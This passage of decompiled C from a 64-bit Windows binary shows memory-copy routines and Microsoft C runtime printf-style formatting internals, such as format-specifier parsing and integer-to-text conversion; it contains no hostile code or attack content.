          v48 = (unsigned __int64)(v46 - 16);
          v49 = a3 - 16;
          if ( (v48 & 0xF) != 0 )
          {
            v50 = (_OWORD *)v48;
            v48 &= 0xFFFFFFFFFFFFFFF0uLL;
            v51 = v47;
            v47 = *(_OWORD *)(v48 + v6);
            *v50 = v51;
            v49 = v48 - (_QWORD)a1;
          }
          v52 = v49 >> 7;
          if ( v49 >> 7 != 0 )
          {
            for ( *(_OWORD *)v48 = v47; ; *(_OWORD *)v48 = v58 )
            {
              v53 = *(_OWORD *)(v48 + v6 - 16);
              v54 = *(_OWORD *)(v48 + v6 - 32);
              v48 -= 128LL;
              *(_OWORD *)(v48 + 112) = v53;
              *(_OWORD *)(v48 + 96) = v54;
              v55 = *(_OWORD *)(v48 + v6 + 64);
              --v52;
              *(_OWORD *)(v48 + 80) = *(_OWORD *)(v48 + v6 + 80);
              *(_OWORD *)(v48 + 64) = v55;
              v56 = *(_OWORD *)(v48 + v6 + 32);
              *(_OWORD *)(v48 + 48) = *(_OWORD *)(v48 + v6 + 48);
              *(_OWORD *)(v48 + 32) = v56;
              v57 = *(_OWORD *)(v48 + v6 + 16);
              v58 = *(_OWORD *)(v48 + v6);
              if ( v52 == 0 )
                break;
              *(_OWORD *)(v48 + 16) = v57;
            }
            *(_OWORD *)(v48 + 16) = v57;
            v49 &= 0x7Fu;
            v47 = v58;
          }
          for ( i = v49 >> 4; i != 0; --i )
          {
            *(_OWORD *)v48 = v47;
            v48 -= 16LL;
            v47 = *(_OWORD *)(v48 + v6);
          }
          if ( (v49 & 0xF) != 0 )
            *a1 = *a2;
          *(_OWORD *)v48 = v47;
          result = (__int64)a1;
        }
        else
        {
          if ( a3 <= 0x80 )
          {
            v26 = *(__m128 *)((char *)a1 + v6);
            v28 = (unsigned __int64)&a1[1];
            v31 = a3 - 16;
          }
          else
          {
            if ( _bittest(&dword_14001CF00, 1u) )
              return sub_1400036B0(a1, v6, a3);
            v26 = *(__m128 *)((char *)a1 + v6);
            v27 = &a1->m128i_i8[a3];
            v28 = (unsigned __int64)&a1[1];
            if ( ((unsigned __int8)a1 & 0xF) != 0 )
            {
              v29 = v26;
              v30 = v28 & 0xFFFFFFFFFFFFFFF0uLL;
              v26 = *(__m128 *)(v30 + v6);
              v28 = v30 + 16;
              *a1 = (__m128i)v29;
            }
            v31 = (unsigned __int64)&v27[-v28];
            v32 = v31 >> 7;
            if ( v31 >> 7 != 0 )
            {
              *(__m128 *)(v28 - 16) = v26;
              if ( v32 <= qword_14001C020 )
              {
                while ( 1 )
                {
                  v33 = *(_OWORD *)(v28 + v6);
                  v34 = *(_OWORD *)(v28 + v6 + 16);
                  v28 += 128LL;
                  *(_OWORD *)(v28 - 128) = v33;
                  *(_OWORD *)(v28 - 112) = v34;
                  v35 = *(_OWORD *)(v28 + v6 - 80);
                  --v32;
                  *(_OWORD *)(v28 - 96) = *(_OWORD *)(v28 + v6 - 96);
                  *(_OWORD *)(v28 - 80) = v35;
                  v36 = *(_OWORD *)(v28 + v6 - 48);
                  *(_OWORD *)(v28 - 64) = *(_OWORD *)(v28 + v6 - 64);
                  *(_OWORD *)(v28 - 48) = v36;
                  v37 = *(__m128 *)(v28 + v6 - 32);
                  v38 = *(__m128 *)(v28 + v6 - 16);
                  if ( v32 == 0 )
                    break;
                  *(__m128 *)(v28 - 32) = v37;
                  *(__m128 *)(v28 - 16) = v38;
                }
              }
              else
              {
                while ( 1 )
                {
                  _mm_prefetch((const char *)(v28 + v6 + 512), 0);
                  v41 = *(__m128 *)(v28 + v6);
                  v42 = *(__m128 *)(v28 + v6 + 16);
                  v28 += 128LL;
                  _mm_stream_ps((float *)(v28 - 128), v41);
                  _mm_stream_ps((float *)(v28 - 112), v42);
                  v43 = *(__m128 *)(v28 + v6 - 80);
                  --v32;
                  _mm_stream_ps((float *)(v28 - 96), *(__m128 *)(v28 + v6 - 96));
                  _mm_stream_ps((float *)(v28 - 80), v43);
                  v44 = *(__m128 *)(v28 + v6 - 64);
                  v45 = *(__m128 *)(v28 + v6 - 48);
                  _mm_prefetch((const char *)(v28 + v6 + 576), 0);
                  _mm_stream_ps((float *)(v28 - 64), v44);
                  _mm_stream_ps((float *)(v28 - 48), v45);
                  v37 = *(__m128 *)(v28 + v6 - 32);
                  v38 = *(__m128 *)(v28 + v6 - 16);
                  if ( v32 == 0 )
                    break;
                  _mm_stream_ps((float *)(v28 - 32), v37);
                  _mm_stream_ps((float *)(v28 - 16), v38);
                }
                _mm_sfence();
              }
              *(__m128 *)(v28 - 32) = v37;
              v31 &= 0x7Fu;
              v26 = v38;
            }
          }
          for ( j = v31 >> 4; j != 0; --j )
          {
            *(__m128 *)(v28 - 16) = v26;
            v26 = *(__m128 *)(v28 + v6);
            v28 += 16LL;
          }
          v40 = v31 & 0xF;
          if ( v40 != 0 )
            *(_OWORD *)(v28 + v40 - 16) = *(_OWORD *)(v28 + v40 + v6 - 16);
          *(__m128 *)(v28 - 16) = v26;
          result = (__int64)a1;
        }
      }
      break;
  }
  return result;
}


// ===== _CallSettingFrame @ 0x140003b10 size=0x40 =====
void CallSettingFrame()
{
  void (*v0)(void); // rax

  NLG_Notify();
  v0();
  _NLG_Return2();
  NLG_Notify();
}


// ===== _CallSettingFrameEncoded @ 0x140003b60 size=0x47 =====
void __fastcall CallSettingFrameEncoded(__int64 a1, __int64 a2, __int64 a3)
{
  void (__fastcall *v3)(__int64); // rax

  NLG_Notify();
  v3(a3);
  _NLG_Return2();
  NLG_Notify();
}


// ===== sub_140003BA8 @ 0x140003ba8 size=0x1b4 =====
__int64 __fastcall sub_140003BA8(
        int a1,
        _WORD *a2,
        unsigned __int64 a3,
        __int64 a4,
        struct __crt_locale_pointers *a5,
        __int64 a6)
{
  int v6; // ebx
  int v11; // eax
  unsigned __int64 v12; // rbx
  __int64 v13; // rax
  __m128i v14; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v15; // [rsp+40h] [rbp-C0h]
  char v16; // [rsp+48h] [rbp-B8h]
  __m128i *v17; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v18; // [rsp+58h] [rbp-A8h] BYREF
  _BYTE v19[32]; // [rsp+60h] [rbp-A0h] BYREF
  _BYTE v20[1120]; // [rsp+80h] [rbp-80h] BYREF
  void *Block; // [rsp+4E0h] [rbp+3E0h]

  v6 = a4;
  if ( a4 == 0 || a3 != 0 && a2 == nullptr )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0xFFFFFFFFLL;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v18, a5);
  sub_140002F60(&v14, 0, 0x20u);
  v14.m128i_i64[0] = (__int64)a2;
  v14.m128i_i64[1] = a3;
  v15 = 0;
  if ( (a1 & 2) != 0 || (v16 = 0, a2 == nullptr) )
    v16 = 1;
  v17 = &v14;
  unknown_libname_5((unsigned int)v20, (unsigned int)&v17, a1, v6, (__int64)v19, a6);
  v11 = __crt_stdio_output::output_processor<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>,__crt_stdio_output::format_validation_base<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>>>::process(v20);
  v12 = v11;
  if ( a2 == nullptr )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( (a1 & 2) != 0 )
    {
      if ( a3 == 0 )
        goto LABEL_22;
      if ( v11 < 0 )
      {
        *a2 = 0;
        goto LABEL_22;
      }
      v13 = v15;
      if ( v15 != a3 )
      {
LABEL_21:
        a2[v13] = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( a3 == 0 )
      {
LABEL_26:
        LODWORD(v12) = -1;
        goto LABEL_22;
      }
      v13 = v15;
      if ( v15 != a3 )
        goto LABEL_21;
      LODWORD(v12) = -2;
    }
    a2[a3 - 1] = 0;
    goto LABEL_22;
  }
  if ( a3 == 0 && v11 != 0 )
    goto LABEL_26;
  v13 = v15;
  if ( v15 != a3 )
    goto LABEL_21;
  if ( (v12 & 0x80000000) == 0LL && v12 > a3 )
    goto LABEL_26;
LABEL_22:
  free_base(Block);
  Block = nullptr;
  if ( v19[16] != 0 )
    *(_DWORD *)(v18 + 936) &= ~2u;
  return (unsigned int)v12;
}


// ===== ??$ensure_buffer_is_big_enough@D@formatting_buffer@__crt_stdio_output@@QEAA_N_K@Z @ 0x140003d5c size=0xac =====
char __fastcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(
        __int64 a1,
        unsigned __int64 a2)
{
  size_t v4; // rsi
  char v5; // di
  void *v6; // rbx

  if ( ((0xFFFFFFFFFFFFFFFFuLL / a2) & 0xFFFFFFFFFFFFFFFEuLL) >= 2 )
  {
    v4 = 2 * a2;
    v5 = 0;
    if ( (*(_QWORD *)(a1 + 1032) != 0 || v4 > 0x400) && v4 > *(_QWORD *)(a1 + 1024) )
    {
      v6 = malloc_base(v4);
      if ( v6 != nullptr )
      {
        free_base(*(void **)(a1 + 1032));
        *(_QWORD *)(a1 + 1032) = v6;
        v5 = 1;
        *(_QWORD *)(a1 + 1024) = v4;
      }
      free_base(nullptr);
      return v5;
    }
    else
    {
      return 1;
    }
  }
  else
  {
    *errno() = 12;
    return 0;
  }
}


// ===== ??$is_wide_character_specifier@_W@__crt_stdio_output@@YA_N_K_WW4length_modifier@0@@Z @ 0x140003e08 size=0x44 =====
bool __fastcall __crt_stdio_output::is_wide_character_specifier<wchar_t>(char a1, __int16 a2, int a3)
{
  if ( a3 == 2 )
    return false;
  if ( a3 == 3 || a3 == 12 || a3 == 13 )
    return true;
  return ((a1 & 4) != 0) == (((a2 - 99) & 0xFFEF) == 0);
}


// ===== unknown_libname_3 @ 0x140003e4c size=0x9b =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_3(__int64 a1, unsigned int a2, unsigned int a3, char a4)
{
  __int64 v4; // rax
  __int64 v6; // rcx
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 result; // rax
  char v12; // dl
  int v13; // r8d

  v4 = a1 + 88;
  v6 = *(_QWORD *)(a1 + 1120);
  if ( v6 == 0 )
    v6 = v4;
  if ( *(_QWORD *)(v4 + 1032) != 0 )
    v9 = *(_QWORD *)(v4 + 1024) >> 1;
  else
    v9 = 512;
  v10 = v9 + v6 - 1;
  for ( *(_QWORD *)(a1 + 72) = v10; ; --*(_QWORD *)(a1 + 72) )
  {
    result = *(unsigned int *)(a1 + 56);
    if ( (int)result <= 0 && a2 == 0 )
      break;
    *(_DWORD *)(a1 + 56) = result - 1;
    v12 = a2 % a3 + 48;
    a2 /= a3;
    if ( v12 > 57 )
      v12 += a4 != 0 ? 7 : 39;
    **(_BYTE **)(a1 + 72) = v12;
  }
  v13 = v10 - *(_DWORD *)(a1 + 72);
  ++*(_QWORD *)(a1 + 72);
  *(_DWORD *)(a1 + 80) = v13;
  return result;
}


// ===== unknown_libname_4 @ 0x140003ee8 size=0x9c =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_4(__int64 a1, unsigned __int64 a2, unsigned int a3, char a4)
{
  __int64 v4; // rax
  unsigned __int64 v5; // rbx
  __int64 v8; // rcx
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 result; // rax
  char v12; // dl
  int v13; // r8d

  v4 = a1 + 88;
  v5 = a3;
  v8 = *(_QWORD *)(a1 + 1120);
  if ( v8 == 0 )
    v8 = v4;
  if ( *(_QWORD *)(v4 + 1032) != 0 )
    v9 = *(_QWORD *)(v4 + 1024) >> 1;
  else
    v9 = 512;
  v10 = v9 + v8 - 1;
  for ( *(_QWORD *)(a1 + 72) = v10; ; --*(_QWORD *)(a1 + 72) )
  {
    result = *(unsigned int *)(a1 + 56);
    if ( (int)result <= 0 && a2 == 0 )
      break;
    *(_DWORD *)(a1 + 56) = result - 1;
    v12 = a2 % v5 + 48;
    a2 /= v5;
    if ( v12 > 57 )
      v12 += a4 != 0 ? 7 : 39;
    **(_BYTE **)(a1 + 72) = v12;
  }
  v13 = v10 - *(_DWORD *)(a1 + 72);
  ++*(_QWORD *)(a1 + 72);
  *(_DWORD *)(a1 + 80) = v13;
  return result;
}


// ===== ??$write_multiple_characters@V?$string_output_adapter@_W@__crt_stdio_output@@D@__crt_stdio_output@@YAXAEBV?$string_output_adapter@_W@0@DHQEAH@Z @ 0x140003f84 size=0x6e =====
__int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
        __int64 *a1,
        char a2,
        int a3,
        _DWORD *a4)
{
  int i; // r11d
  __int64 result; // rax

  if ( a3 > 0 )
  {
    for ( i = 0; i < a3; ++i )
    {
      result = *(_QWORD *)(*a1 + 8);
      if ( *(_QWORD *)(*a1 + 16) == result )
      {
        if ( *(_BYTE *)(*a1 + 24) != 0 )
          ++*a4;
        else
          *a4 = -1;
      }
      else
      {
        ++*a4;
        ++*(_QWORD *)(*a1 + 16);
        **(_WORD **)*a1 = a2;
        result = *a1;
        *(_QWORD *)*a1 += 2LL;
      }
      if ( *a4 == -1 )
        break;
    }
  }
  return result;
}


// ===== unknown_libname_5 @ 0x140003ff4 size=0x7f =====
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_5(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  *(_QWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 24) = 0;
  *(_QWORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_BYTE *)(a1 + 64) = 0;
  *(_WORD *)(a1 + 66) = 0;
  *(_DWORD *)(a1 + 80) = 0;
  *(_BYTE *)(a1 + 84) = 0;
  *(_QWORD *)(a1 + 1112) = 0;
  *(_QWORD *)(a1 + 1120) = 0;
  *(_QWORD *)(a1 + 1128) = *a2;
  *(_QWORD *)(a1 + 8) = a5;
  *(_QWORD *)(a1 + 32) = a6;
  *(_QWORD *)a1 = a3;
  *(_QWORD *)(a1 + 24) = a4;
  *(_DWORD *)(a1 + 1136) = 0;
  *(_QWORD *)(a1 + 16) = errno();
  return a1;
}


// ===== ??0_LocaleUpdate@@QEAA@QEAU__crt_locale_pointers@@@Z @ 0x140004074 size=0x90 =====
_LocaleUpdate *__fastcall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, struct __crt_locale_pointers *const a2)
{
  __int128 v3; // xmm0
  __int64 v4; // rax
  int v5; // eax

  *((_BYTE *)this + 24) = 0;
  if ( a2 != nullptr )
  {
    v3 = (__int128)*a2;
LABEL_5:
    *(_OWORD *)((char *)this + 8) = v3;
    return this;
  }
  if ( dword_14001D2E4 == 0 )
  {
    v3 = *(_OWORD *)&off_14001C2B8;
    goto LABEL_5;
  }
  v4 = _acrt_getptd();
  *(_QWORD *)this = v4;
  *((_QWORD *)this + 1) = *(_QWORD *)(v4 + 144);
  *((_QWORD *)this + 2) = *(_QWORD *)(v4 + 136);
  sub_140007FBC(v4);
  sub_140007FF0(*(_QWORD *)this, (char *)this + 16);
  v5 = *(_DWORD *)(*(_QWORD *)this + 936LL);
  if ( (v5 & 2) == 0 )
  {
    *(_DWORD *)(*(_QWORD *)this + 936LL) = v5 | 2;
    *((_BYTE *)this + 24) = 1;
  }
  return this;
}


// ===== ?force_decimal_point@__crt_stdio_output@@YAXPEADQEAU__crt_locale_pointers@@@Z @ 0x140004104 size=0x6d =====
void __fastcall __crt_stdio_output::force_decimal_point(
        __crt_stdio_output *this,
        char *a2,
        struct __crt_locale_pointers *const a3)
{
  __crt_stdio_output *v3; // rbx
  char v5; // dl
  char *v6; // rbx
  char v7; // al
  char v8; // al

  v3 = this;
  if ( tolower(*(char *)this) != 101 )
  {
    do
      v3 = (__crt_stdio_output *)((char *)v3 + 1);
    while ( isdigit(*(unsigned __int8 *)v3) != 0 );
  }
  if ( tolower(*(char *)v3) == 120 )
    v3 = (__crt_stdio_output *)((char *)v3 + 2);
  v5 = *(_BYTE *)v3;
  *(_BYTE *)v3 = ***(_BYTE ***)(*(_QWORD *)a2 + 248LL);
  v6 = (char *)v3 + 1;
  do
  {
    v7 = *v6;
    *v6 = v5;
    v5 = v7;
    v8 = *v6++;
  }
  while ( v8 != 0 );
}


// ===== unknown_libname_6 @ 0x140004174 size=0x7f =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_6(__int64 a1, int *a2)
{
  int *v2; // rsi
  int v4; // ebp
  __int64 v5; // rcx
  char result; // al
  wchar_t *v7; // [rsp+30h] [rbp+8h] BYREF

  v2 = *(int **)(a1 + 16);
  v4 = *v2;
  *v2 = 0;
  v5 = *(_QWORD *)(a1 + 24);
  v7 = nullptr;
  *a2 = wcstol((const wchar_t *)(v5 - 2), &v7, 10);
  if ( **(_DWORD **)(a1 + 16) == 34 || (unsigned __int64)v7 < *(_QWORD *)(a1 + 24) )
  {
    result = 0;
  }
  else
  {
    *(_QWORD *)(a1 + 24) = v7;
    result = 1;
  }
  if ( *v2 == 0 && v4 != 0 )
    *v2 = v4;
  return result;
}


// ===== ?process@?$output_processor@_WV?$string_output_adapter@_W@__crt_stdio_output@@V?$format_validation_base@_WV?$string_output_adapter@_W@__crt_stdio_output@@@2@@__crt_stdio_output@@QEAAHXZ @ 0x1400041f4 size=0x286 =====
__int64 __fastcall __crt_stdio_output::output_processor<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>,__crt_stdio_output::format_validation_base<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>>>::process(
        __int64 a1)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  char v11; // al
  int *v12; // rdx
  int v13; // ecx
  int v14; // ecx
  int v15; // eax
  __int16 v16; // dx
  __int64 v17; // rcx
  __int16 v18; // cx

  if ( *(_QWORD *)(a1 + 1128) == 0 || *(_QWORD *)(a1 + 24) == 0 )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0xFFFFFFFFLL;
  }
  if ( ++*(_DWORD *)(a1 + 1136) == 2 )
    return *(unsigned int *)(a1 + 40);
  while ( 2 )
  {
    *(_DWORD *)(a1 + 80) = 0;
    *(_DWORD *)(a1 + 44) = 0;
    while ( 1 )
    {
      v18 = **(_WORD **)(a1 + 24);
      *(_WORD *)(a1 + 66) = v18;
      if ( v18 == 0 )
        break;
      *(_QWORD *)(a1 + 24) += 2LL;
      if ( *(int *)(a1 + 40) < 0 )
        goto LABEL_52;
      if ( (unsigned __int16)(*(_WORD *)(a1 + 66) - 32) > 0x5Au )
        v3 = 0;
      else
        v3 = byte_140011F20[*(unsigned __int16 *)(a1 + 66) - 32] & 0xF;
      v4 = byte_140011F20[*(_DWORD *)(a1 + 44) + 8 * v3 + v3] >> 4;
      *(_DWORD *)(a1 + 44) = v4;
      if ( v4 == 8 )
        goto LABEL_56;
      if ( v4 == 0 )
      {
        v16 = *(_WORD *)(a1 + 66);
        *(_BYTE *)(a1 + 84) = 1;
        v17 = *(_QWORD *)(a1 + 1128);
        if ( *(_QWORD *)(v17 + 16) == *(_QWORD *)(v17 + 8) )
        {
          if ( *(_BYTE *)(v17 + 24) != 0 )
            ++*(_DWORD *)(a1 + 40);
          else
            *(_DWORD *)(a1 + 40) = -1;
        }
        else
        {
          ++*(_DWORD *)(a1 + 40);
          ++*(_QWORD *)(*(_QWORD *)(a1 + 1128) + 16LL);
          ***(_WORD ***)(a1 + 1128) = v16;
          **(_QWORD **)(a1 + 1128) += 2LL;
        }
LABEL_48:
        v11 = 1;
        goto LABEL_49;
      }
      v5 = v4 - 1;
      if ( v5 != 0 )
      {
        v6 = v5 - 1;
        if ( v6 != 0 )
        {
          v7 = v6 - 1;
          if ( v7 == 0 )
          {
            if ( *(_WORD *)(a1 + 66) == 42 )
            {
              *(_QWORD *)(a1 + 32) += 8LL;
              v14 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8LL);
              *(_DWORD *)(a1 + 52) = v14;
              if ( v14 < 0 )
              {
                *(_DWORD *)(a1 + 48) |= 4u;
                *(_DWORD *)(a1 + 52) = -v14;
              }
              goto LABEL_48;
            }
            v12 = (int *)(a1 + 52);
            goto LABEL_23;
          }
          v8 = v7 - 1;
          if ( v8 != 0 )
          {
            v9 = v8 - 1;
            if ( v9 != 0 )
            {
              v10 = v9 - 1;
              if ( v10 != 0 )
              {
                if ( v10 != 1 )
                  return 0xFFFFFFFFLL;
                v11 = sub_140004620(a1);
              }
              else
              {
                v11 = sub_14000447C(a1);
              }
              goto LABEL_49;
            }
            if ( *(_WORD *)(a1 + 66) == 42 )
            {
              *(_QWORD *)(a1 + 32) += 8LL;
              v13 = *(_DWORD *)(*(_QWORD *)(a1 + 32) - 8LL);
              if ( v13 < 0 )
                v13 = -1;
              *(_DWORD *)(a1 + 56) = v13;
              goto LABEL_48;
            }
            v12 = (int *)(a1 + 56);
LABEL_23:
            v11 = unknown_libname_6(a1, v12);
LABEL_49:
            if ( v11 == 0 )
              return 0xFFFFFFFFLL;
          }
          else
          {
            *(_DWORD *)(a1 + 56) = 0;
          }
        }
        else
        {
          v15 = *(unsigned __int16 *)(a1 + 66);
          switch ( v15 )
          {
            case ' ':
              *(_DWORD *)(a1 + 48) |= 2u;
              break;
            case '#':
              *(_DWORD *)(a1 + 48) |= 0x20u;
              break;
            case '+':
              *(_DWORD *)(a1 + 48) |= 1u;
              break;
            case '-':
              *(_DWORD *)(a1 + 48) |= 4u;
              break;
            case '0':
              *(_DWORD *)(a1 + 48) |= 8u;
              break;
            default:
              break;
          }
        }
      }
      else
      {
        *(_QWORD *)(a1 + 48) = 0;
        *(_BYTE *)(a1 + 64) = 0;
        *(_DWORD *)(a1 + 56) = -1;
        *(_DWORD *)(a1 + 60) = 0;
        *(_BYTE *)(a1 + 84) = 0;
      }
    }
    *(_QWORD *)(a1 + 24) += 2LL;
LABEL_52:
    if ( *(_DWORD *)(a1 + 44) != 0 && *(_DWORD *)(a1 + 44) != 7 )
    {
LABEL_56:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0xFFFFFFFFLL;
    }
    if ( ++*(_DWORD *)(a1 + 1136) != 2 )
      continue;
    return *(unsigned int *)(a1 + 40);
  }
}


// ===== sub_14000447C @ 0x14000447c size=0x1a2 =====
char __fastcall sub_14000447C(__int64 a1)
{
  char result; // al
  int v2; // eax
  bool v3; // zf
  _WORD *v4; // rax
  _WORD *v5; // rax
  __int16 *v6; // rdx
  __int16 v7; // ax
  unsigned __int16 v8; // ax
  __int64 v9; // rdx

  if ( *(_WORD *)(a1 + 66) == 70 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 7;
      return sub_140004620(a1);
    }
    return 1;
  }
  if ( *(_WORD *)(a1 + 66) == 78 )
  {
    if ( (*(_BYTE *)a1 & 8) == 0 )
    {
      *(_DWORD *)(a1 + 44) = 8;
LABEL_7:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( *(_DWORD *)(a1 + 60) != 0 )
    goto LABEL_7;
  v2 = *(unsigned __int16 *)(a1 + 66);
  switch ( v2 )
  {
    case 'I':
      v6 = *(__int16 **)(a1 + 24);
      v7 = *v6;
      if ( *(_DWORD *)v6 == 3276851 )
      {
        *(_DWORD *)(a1 + 60) = 10;
        *(_QWORD *)(a1 + 24) = v6 + 2;
      }
      else if ( v7 == 54 && v6[1] == 52 )
      {
        *(_DWORD *)(a1 + 60) = 11;
        *(_QWORD *)(a1 + 24) = v6 + 2;
      }
      else
      {
        v8 = v7 - 88;
        if ( v8 <= 0x20u )
        {
          v9 = 0x120821001LL;
          if ( _bittest64(&v9, v8) )
            *(_DWORD *)(a1 + 60) = 9;
        }
      }
      return 1;
    case 'L':
      *(_DWORD *)(a1 + 60) = 8;
      return 1;
    case 'T':
      *(_DWORD *)(a1 + 60) = 13;
      return 1;
    case 'h':
      v5 = *(_WORD **)(a1 + 24);
      if ( *v5 == 104 )
      {
        *(_DWORD *)(a1 + 60) = 1;
        *(_QWORD *)(a1 + 24) = v5 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 2;
      }
      return 1;
    case 'j':
      *(_DWORD *)(a1 + 60) = 5;
      return 1;
    case 'l':
      v4 = *(_WORD **)(a1 + 24);
      if ( *v4 == 108 )
      {
        *(_DWORD *)(a1 + 60) = 4;
        *(_QWORD *)(a1 + 24) = v4 + 1;
      }
      else
      {
        *(_DWORD *)(a1 + 60) = 3;
      }
      return 1;
    case 't':
      *(_DWORD *)(a1 + 60) = 7;
      return 1;
    case 'w':
      *(_DWORD *)(a1 + 60) = 12;
      return 1;
    default:
      break;
  }
  v3 = v2 == 122;
  result = 1;
  if ( v3 )
    *(_DWORD *)(a1 + 60) = 6;
  return result;
}


// ===== sub_140004620 @ 0x140004620 size=0x2c9 =====
char __fastcall sub_140004620(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // eax
  __int64 v4; // rbx
  char v5; // al
  __int64 v6; // rdx
  int v7; // ecx
  int v9; // edx
  __int64 v10; // rdi
  __int16 v11; // ax
  __int16 v12; // cx
  bool v13; // r8
  bool v14; // al
  int v15; // esi
  int v16; // ecx
  int v17; // [rsp+30h] [rbp-38h] BYREF
  __int16 v18; // [rsp+34h] [rbp-34h]

  v3 = *(unsigned __int16 *)(a1 + 66);
  v4 = a1;
  if ( v3 > 0x64 )
  {
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x67u )
      goto LABEL_34;
    if ( v3 != 105 )
    {
      switch ( v3 )
      {
        case 'n':
          v5 = unknown_libname_10();
          goto LABEL_35;
        case 'o':
          v7 = *(_DWORD *)(a1 + 48);
          if ( (v7 & 0x20) != 0 )
            *(_DWORD *)(v4 + 48) = v7 | 0x80;
          v6 = 8;
          a1 = v4;
          goto LABEL_32;
        case 'p':
          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          LOBYTE(a3) = 1;
          v6 = 16;
LABEL_33:
          v5 = sub_140004C58(a1, v6, a3);
          goto LABEL_35;
        case 's':
LABEL_23:
          v5 = unknown_libname_11();
          goto LABEL_35;
        default:
          break;
      }
      if ( v3 != 117 )
      {
        if ( v3 != 120 )
          return 0;
        v6 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v6 = 10;
LABEL_32:
      a3 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v3 == 100 )
    goto LABEL_30;
  if ( v3 != 65 )
  {
    if ( v3 == 67 )
    {
LABEL_12:
      v5 = unknown_libname_9(a1, 0);
      goto LABEL_35;
    }
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x44u )
      return 0;
    if ( *(unsigned __int16 *)(a1 + 66) > 0x47u )
    {
      if ( v3 != 83 )
      {
        if ( v3 != 88 )
        {
          if ( v3 == 90 )
          {
            v5 = unknown_libname_7();
            goto LABEL_35;
          }
          if ( v3 != 97 )
          {
            if ( v3 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v5 = unknown_libname_8();
LABEL_35:
  if ( v5 == 0 )
    return 0;
  if ( *(_BYTE *)(v4 + 64) == 0 )
  {
    v9 = *(_DWORD *)(v4 + 48);
    v17 = 0;
    v10 = 0;
    v18 = 0;
    if ( (v9 & 0x10) == 0 )
      goto LABEL_47;
    if ( (v9 & 0x40) != 0 )
    {
      v11 = 45;
    }
    else
    {
      if ( (v9 & 1) == 0 )
      {
        if ( (v9 & 2) != 0 )
        {
          LOWORD(v17) = 32;
LABEL_46:
          v10 = 1;
        }
LABEL_47:
        v12 = *(_WORD *)(v4 + 66);
        v13 = ((v12 - 88) & 0xFFDF) == 0 && (v9 & 0x20) != 0;
        if ( v13 || ((v12 - 65) & 0xFFDF) == 0 )
        {
          *((_WORD *)&v17 + v10++) = 48;
          v14 = v12 == 88 || v12 == 65;
          *((_WORD *)&v17 + v10) = v14 ? 88 : 120;
          LODWORD(v10) = v10 + 1;
        }
        v15 = *(_DWORD *)(v4 + 52) - *(_DWORD *)(v4 + 80) - v10;
        if ( (v9 & 0xC) == 0 )
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            (__int64 *)(v4 + 1128),
            32,
            v15,
            (_DWORD *)(v4 + 40));
        __crt_stdio_output::string_output_adapter<wchar_t>::write_string(
          v4 + 1128,
          (unsigned int)&v17,
          v10,
          v4 + 40,
          *(_QWORD *)(v4 + 16));
        v16 = *(_DWORD *)(v4 + 48);
        if ( (v16 & 8) != 0 && (v16 & 4) == 0 )
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            (__int64 *)(v4 + 1128),
            48,
            v15,
            (_DWORD *)(v4 + 40));
        unknown_libname_12(v4, 0);
        if ( *(int *)(v4 + 40) >= 0 && (*(_DWORD *)(v4 + 48) & 4) != 0 )
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            (__int64 *)(v4 + 1128),
            32,
            v15,
            (_DWORD *)(v4 + 40));
        return 1;
      }
      v11 = 43;
    }
    LOWORD(v17) = v11;
    goto LABEL_46;
  }
  return 1;
}


// ===== unknown_libname_7 @ 0x1400048ec size=0x80 =====
// Microsoft VisualC 64bit universal runtime
char __fastcall unknown_libname_7(__int64 a1)
{
  unsigned __int16 *v2; // rdi
  __int64 v3; // rsi
